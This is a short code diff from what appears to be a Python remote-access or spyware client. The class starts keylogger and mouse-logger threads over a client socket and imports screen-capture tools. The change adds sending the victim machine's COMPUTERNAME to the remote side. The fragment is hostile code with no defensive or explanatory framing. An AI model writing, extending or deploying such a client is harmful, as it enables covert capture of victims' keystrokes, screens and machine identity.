@@ -9,6 +9,7 @@ from zlib import compress
 from mss import mss
 import base64
 import pyautogui
+import os
 
 
 WIDTH = 1900
@@ -25,7 +26,9 @@ class Target():
 class Main():
     def __init__(self, client_socket):
         self.client_socket = client_socket
+        name = os.environ['COMPUTERNAME']
         SuperSocket(self.client_socket).send_msg(("0").encode())
+        SuperSocket(self.client_socket).send_msg((name).encode())
         threading.Thread(target=self.keylogger,
                              args=()).start()
         threading.Thread(target=self.mouse_logger,
